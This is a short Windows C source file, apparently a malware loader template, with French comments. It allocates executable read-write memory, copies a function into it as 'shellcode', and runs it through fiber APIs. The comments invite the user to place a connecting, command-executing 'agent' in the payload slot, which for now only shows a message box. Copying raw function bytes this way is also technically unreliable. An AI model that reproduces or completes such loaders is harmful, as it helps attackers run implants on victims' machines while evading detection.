#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void WINAPI shellcode_entry(LPVOID lpParam) {
    // Ton agent ici (extrait de main)
    // Connexion, réception, exécution, etc.
    MessageBoxA(NULL, "Shellcode via fiber", "Fiber", MB_OK);
}

int main() {
    LPVOID mainFiber = ConvertThreadToFiber(NULL);

    // Allouer mémoire RWX
    LPVOID mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode_entry, 4096); // Copie du shellcode

    // Créer une fibre vers le shellcode
    LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);

    // Exécuter
    SwitchToFiber(fiber);

    DeleteFiber(fiber);
    return 0;
}